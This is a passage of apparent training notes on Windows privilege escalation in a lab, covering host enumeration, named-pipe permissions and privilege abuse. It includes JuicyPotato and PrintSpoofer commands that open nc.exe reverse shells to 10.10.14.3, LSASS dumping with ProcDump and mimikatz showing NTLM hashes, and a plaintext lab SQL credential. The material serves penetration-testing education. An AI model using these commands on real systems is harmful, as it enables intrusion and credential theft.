                                 [02]: fe80::f055:fefd:b1b:9919
Hyper-V Requirements:      A hypervisor has been detected. Features required
```

&nbsp;

&nbsp;

#### Patches and Updates

If `systeminfo` doesn't display hotfixes, they may be queriable with [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) using the WMI-Command binary with [QFE (Quick Fix Engineering)](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering) to display patches.

Initial Enumeration

```cmd-session
C:\local> wmic qfe

Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016
https://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update               KB5001078               NT AUTHORITY\SYSTEM  3/25/2021
http://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update               KB4103723
```

&nbsp;

&nbsp;

We can do this with PowerShell as well using the [Get-Hotfix](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1) cmdlet.

Initial Enumeration

```powershell-session
PS C:\local> Get-HotFix | ft -AutoSize

Source       Description     HotFixID  InstalledBy                InstalledOn
------       -----------     --------  -----------                -----------
WINLPE-SRV01 Update          KB3199986 NT AUTHORITY\SYSTEM        11/21/2016 12:00:00 AM
WINLPE-SRV01 Update          KB4054590 WINLPE-SRV01\Administrator 3/30/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\SYSTEM        3/25/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB3200970 WINLPE-SRV01\Administrator 4/13/2021 12:00:00 AM
```

&nbsp;

&nbsp;

&nbsp;

#### Installed Programs

WMI can also be used to display installed software. This information can often guide us towards hard-to-find exploits. Is `FileZilla`/`Putty`/etc installed? Run `LaZagne` to check if stored credentials for those applications are installed. Also, some programs may be installed and running as a service that is vulnerable.

Initial Enumeration

```cmd-session
C:\local> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
Java 8 Update 231 (64-bit)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
Java Auto Updater

<SNIP>
```

We can, of course, d

We can, of course, do this with PowerShell as well using the [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) cmdlet.

Initial Enumeration

```powershell-session
PS C:\local> Get-WmiObject -Class Win32_Product |  select Name, Version

Name                                                                    Version
----                                                                    -------
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
Microsoft OLE DB Driver for SQL Server                                  18.3.0.0
Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219             10.0.40219
Microsoft Help Viewer 2.3                                               2.3.28107
Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219             10.0.40219
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005              12.0.21005
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005           12.0.21005
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29914          14.28.29914
Microsoft ODBC Driver 13 for SQL Server                                 13.2.5026.0
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
SQL Server 2016 Database Engine Services                                13.2.5026.0
SQL Server Management Studio for Reporting Services                     15.0.18369.0
Microsoft SQL Server 2008 Setup Support Files                           10.3.5500.0
SSMS Post Install Tasks                                                 15.0.18369.0
Microsoft VSS Writer for SQL Server 2016                                13.2.5026.0
Java 8 Update 231 (64-bit)                                              8.0.2310.11
Browser for SQL Server 2016                                             13.2.5026.0
Integration Services                                                    15.0.2000.130

<SNIP>



Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -notmatch "Microsoft" } | Select-Object Name, Version


Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -notmatch "Microsoft|Windows" } | Select-Object Name, Version

```

#### Display Running Processes

&nbsp;

&nbsp;

#### Display Running Processes

The [netstat](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside. We may find a vulnerable service only accessible to the local host (when logged on to the host) that we can exploit to escalate privileges.

#### Netstat

Initial Enumeration

```cmd-session
PS C:\local> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1096
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3520
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       968
<...SNIP...>
```

&nbsp;

&nbsp;

&nbsp;

```cmd-session
C:\local> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM
```

&nbsp;

&nbsp;

#### Current User Privileges

As mentioned prior, knowing what privileges our user has can greatly help in escalating privileges. We will look at individual user privileges and escalation paths later in this module.

Initial Enumeration

```cmd-session
C:\local> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

&nbsp;

&nbsp;

#### Current User Group Information

Has our user inherited any rights through their group membership? Are they privileged in the Active Directory domain environment, which could be leveraged to gain access to more systems?

Initial Enumeration

```cmd-session
C:\local> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

&nbsp;

&nbsp;

#### Get All Users

Knowing what other users are on the system is important as well. If we gained RDP access to a host using credentials we captured for a user `bob`, and see a `bob_adm` user in the local administrators group, it is worth checking for credential re-use. Can we access the user profile directory for any important users? We may find valuable files such as scripts with passwords or SSH keys in a user's Desktop, Documents, or Downloads folder.

Initial Enumeration

```cmd-session
C:\local> net user

User accounts for \\WINLPE-SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
helpdesk                 local-student              jordan
sarah                    secsvc
The command completed successfully.
```

&nbsp;

&nbsp;

&nbsp;

#### Get All Groups

Knowing what non-standard groups are present on the host can help us determine what the host is used for, how heavily accessed it is, or may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups.

Initial Enumeration

```cmd-session
C:\local> net localgroup

Aliases for \\WINLPE-SRV01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.
```

&nbsp;

&nbsp;

#### Details About a Group

It is worth checking out the details for any non-standard groups. Though unlikely, we may find a password or other interesting information stored in the group's description. During our enumeration, we may discover credentials of another non-admin user who is a member of a local group that can be leveraged to escalate privileges.

Initial Enumeration

```cmd-session
C:\local> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
helpdesk
sarah
secsvc
The command completed successfully
```

&nbsp;

&nbsp;

#### Get Password Policy & Other Account Information

Initial Enumeration

```cmd-session
C:\local> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
```

&nbsp;

&nbsp;

# Communication with Processes

&nbsp;

#### Listing Named Pipes with Pipelist

Communication with Processes

```cmd-session
C:\local> pipelist.exe /accepteula

PipeList v1.02 - Lists open named pipes
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               -1
lsass                                             4               -1
ntsvcs                                            3               -1
scerpc                                            3               -1
Winsock2\CatalogChangeListener-340-0              1                1
Winsock2\CatalogChangeListener-414-0              1                1
epmapper                                          3               -1
Winsock2\CatalogChangeListener-3ec-0              1                1
Winsock2\CatalogChangeListener-44c-0              1                1
LSM_API_service                                   3               -1
atsvc                                             3               -1
Winsock2\CatalogChangeListener-5e0-0              1                1
eventlog                                          3               -1
Winsock2\CatalogChangeListener-6a8-0              1                1
spoolss                                           3               -1
Winsock2\CatalogChangeListener-ec0-0              1                1
wkssvc                                            4               -1
trkwks                                            3               -1
vmware-usbarbpipe                                 5               -1
srvsvc
```

&nbsp;

&nbsp;

#### Listing Named Pipes with PowerShell

Communication with Processes

```powershell-session
PS C:\local>  gci \\.\pipe\


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 InitShutdown
------       12/31/1600   4:00 PM              4 lsass
------       12/31/1600   4:00 PM              3 ntsvcs
------       12/31/1600   4:00 PM              3 scerpc


    Directory: \\.\pipe\Winsock2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              1 Winsock2\CatalogChangeListener-34c-0


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 epmapper

<SNIP>
```

&nbsp;

&nbsp;

#### Reviewing LSASS Named Pipe Permissions

Communication with Processes

```cmd-session
C:\local> accesschk.exe /accepteula \\.\Pipe\lsass -v

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\lsass
  Untrusted Mandatory Level [No-Write-Up]
  RW Everyone
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
```

&nbsp;

&nbsp;

&nbsp;

## Named Pipes Attack Example

Let's walk through an example of taking advantage of an exposed named pipe to escalate privileges. This [WindscribeService Named Pipe Privilege Escalation](https://www.exploit-db.com/exploits/48021) is a great example. Using `accesschk` we can search for all named pipes that allow write access with a command such as `accesschk.exe -w \pipe\* -v` and notice that the `WindscribeService` named pipe allows `READ` and `WRITE` access to the `Everyone` group, meaning all authenticated users.

#### Checking WindscribeService Named Pipe Permissions

Confirming with `accesschk` we see that the Everyone group does indeed have `FILE_ALL_ACCESS` (All possible access rights) over the pipe.

Communication with Processes

```cmd-session
C:\local> accesschk.exe -accepteula -w \pipe\WindscribeService -v

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
```

From here, we could leverage these lax permissions to escalate privileges on the host to SYSTEM.

VPN Servers

&nbsp;

&nbsp;

# Windows Privileges Overview

&nbsp;

![85c6abe427428252b5f141a3a2f73b9c.png](/resources/85c6abe427428252b5f141a3a2f73b9c.png)

&nbsp;

&nbsp;

| **Group** | **Description** |
| --- | --- |
| Default Administrators | Domain Admins and Enterprise Admins are "super" groups. |
| Server Operators | Members can modify services, access SMB shares, and backup files. |
| Backup Operators | Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs. |
| Print Operators | Members can log on to DCs locally and "trick" Windows into loading a malicious driver. |
| Hyper-V Administrators | If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins. |
| Account Operators | Members can modify non-protected accounts and groups in the domain. |
| Remote Desktop Users | Members are not given any useful permissions by default but are often granted additional rights such as `Allow Login Through Remote Desktop Services` and can move laterally using the RDP protocol. |
| Remote Management Users | Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs). |
| Group Policy Creator Owners | Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU. |
| Schema Admins | Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL. |
| DNS Admins | Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to [create a WPAD record](https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/). |

&nbsp;

&nbsp;

## User Rights Assignment

Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account. This Microsoft article on [User Rights Assignment](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment) provides a detailed explanation of each of the user rights that can be set in Windows as well as security considerations applicable to each right. Below are some of the key user rights assignments, which are settings applied to the localhost. These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.

| Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) | Setting Name | Standard Assignment | Description |
| --- | --- | --- | --- |
| SeNetworkLogonRight | [Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network) | Administrators, Authenticated Users | Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+. |
| SeRemoteInteractiveLogonRight | [Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services) | Administrators, Remote Desktop Users | This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server. |
| SeBackupPrivilege | [Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories) | Administrators | This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system. |
| SeSecurityPrivilege | [Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log) | Administrators | This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer. |
| SeTakeOwnershipPrivilege | [Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) | Administrators | This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads. |
| SeDebugPrivilege | [Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) | Administrators | This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components. |
| SeImpersonatePrivilege | [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) | Administrators, Local Service, Network Service, Service | This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user. |
| SeLoadDriverPrivilege | [Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers) | Administrators | This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code. |
| SeRestorePrivilege | [Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories) | Administrators | This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object |

&nbsp;

process. One example is this PowerShell [script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) which can be used to enable certain privileges, or this [script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) which can be used to adjust token privileges.

&nbsp;

#### Backup Operators Rights

Windows Privileges Overview

```powershell-session
PS C:\local> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

&nbsp;

&nbsp;

## SeImpersonate Example - JuicyPotato

Let's take the example below, where we have gained a foothold on a SQL server using a privileged SQL user. Client connections to IIS and SQL Server may be configured to use Windows Authentication. The server may then need to access other resources such as file shares as the connecting client. It can be done by impersonating the user whose context the client connection is established. To do so, the service account will be granted the [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) privilege.

In this scenario, the SQL Service service account is running in the context of the default `mssqlserver` account. Imagine we have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.

#### Connecting with MSSQLClient.py

Using the credentials `sql_dev:Str0ng_P@ssw0rd!`, let's first connect to the SQL server instance and confirm our privileges. We can do this using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the `Impacket` toolkit.

SeImpersonate and SeAssignPrimaryToken

```shell-session
cube111@local[/local]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL>
```

#### Enabling xp_cmdshell

Next, we must enable the `xp_cmdshell` stored procedure to run operating system commands. We can do this via the Impacket MSSSQL shell by typing `enable_xp_cmdshell`. Typing `help` displays a few other command options.

SeImpersonate and SeAssignPrimaryToken

```shell-session
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

Note: We don't actually have to type `RECONFIGURE` as Impacket does this for us.

#### Confirming Access

With this access, we can confirm that we are indeed running in the context of a SQL Server service account.

SeImpersonate and SeAssignPrimaryToken

```shell-session
SQL> xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

#### Checking Account Privileges

Next, let's check what privileges the service account has been granted.

SeImpersonate and SeAssignPrimaryToken

```shell-session
SQL> xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

The command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed. This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.

#### Escalating Privileges Using JuicyPotato

To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call. Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.

SeImpersonate and SeAssignPrimaryToken

```shell-session
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08
```

#### Catching SYSTEM Shell

This completes successfully, and a shell as `NT AUTHORITY\SYSTEM` is received.

SeImpersonate and SeAssignPrimaryToken

```shell-session
cube111@local[/local]$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system


C:\Windows\system32>hostname

hostname
WINLPE-SRV01
```

* * *

## PrintSpoofer and RoguePotato

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

#### Escalating Privileges using PrintSpoofer

Let's try this out using the `PrintSpoofer` tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with `mssqlclient.py` and use the tool with the `-c` argument to execute a command. Here, using `nc.exe` to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).

SeImpersonate and SeAssignPrimaryToken

```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL
```

#### Catching Reverse Shell as SYSTEM

If all goes according to plan, we will have a SYSTEM shell on our netcat listener.

SeImpersonate and SeAssignPrimaryToken

```shell-session
cube111@local[/local]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system
```

&nbsp;

&nbsp;

# SeDebugPrivilege

&nbsp;

```cmd-session
C:\local> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set
```

&nbsp;

&nbsp;

We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.

&nbsp;

&nbsp;

SeDebugPrivilege

```cmd-session
C:\local> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

&nbsp;

&nbsp;

&nbsp;

```cmd-session
C:\local> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP> 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

<SNIP>
```

&nbsp;

&nbsp;

![629451702bf2ebd574a3a56b6fbeba93.png](/resources/629451702bf2ebd574a3a56b6fbeba93.png)

&nbsp;

&nbsp;

## Remote Code Execution as SYSTEM

We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly. Let's see this in action.

First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.

The PoC script has received an update. Please visit its GitHub repository and review its usage. https://github.com/decoder-it/psgetsystem

First, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the `jordan` user). Next, type `tasklist` to get a listing of running processes and accompanying PIDs.

SeDebugPrivilege

```powershell-session
PS C:\local> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

